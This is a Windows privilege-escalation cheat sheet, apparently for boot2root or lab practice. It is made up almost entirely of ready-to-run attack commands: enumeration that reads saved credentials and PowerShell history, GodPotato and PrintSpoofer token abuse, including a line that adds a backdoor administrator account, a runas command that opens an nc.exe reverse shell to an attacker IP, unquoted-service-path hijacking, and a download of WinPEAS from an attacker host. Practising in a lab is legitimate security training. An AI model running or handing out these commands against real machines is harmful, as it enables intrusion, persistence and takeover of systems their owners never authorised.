# Boot2Root: Windows Privilege Escalation

Guide for escalating privileges to `NT AUTHORITY\SYSTEM` on Windows targets.

---

## 1. The 60-Second Manual Checklist

Run these commands in CMD or PowerShell:

```powershell
# 1. Check user privileges and assigned tokens
whoami /priv

# 2. Check group memberships
whoami /groups

# 3. Check saved credentials
cmdkey /list

# 4. Check system information and OS version (patch level)
systeminfo

# 5. Check PowerShell command history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 6. Check internal network listening ports
netstat -ano | findstr LISTENING
```

---

## 2. Token Abuse: `SeImpersonatePrivilege`

If `whoami /priv` shows:
```text
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```
You can escalate directly to `NT AUTHORITY\SYSTEM`.

### Modern Windows (Server 2016, 2019, 2022, Windows 10/11)
Use **GodPotato**:
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
GodPotato-NET4.exe -cmd "cmd.exe /c net user evil Password123! /add && net localgroup administrators evil /add"
```

### Windows Server 2016 / 2019
Use **PrintSpoofer**:
```cmd
PrintSpoofer64.exe -i -c cmd
```

---

## 3. Stored Credentials and Runas

If `cmdkey /list` shows stored credentials for Administrator:
```cmd
runas /savecred /user:Administrator "cmd.exe /c C:\Windows\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"
```

---

## 4. Unquoted Service Paths

Find services with spaces in the executable path and missing quotation marks:
```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

Example vulnerable path:
```text
C:\Program Files\Target Software\Service App\service.exe
```
Windows attempts to run in this order:
1. `C:\Program.exe`
2. `C:\Program Files\Target.exe`
3. `C:\Program Files\Target Software\Service.exe`

If you have write permissions to `C:\Program Files\Target Software\`:
1. Drop your payload as `C:\Program Files\Target Software\Service.exe`.
2. Restart the service:
   ```cmd
   sc stop <SERVICE_NAME>
   sc start <SERVICE_NAME>
   ```

---

## 5. Automated Scanning with WinPEAS

Download and run WinPEAS:
```powershell
# In PowerShell:
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe quiet
```

Look for items highlighted in **RED and YELLOW** in the terminal output.
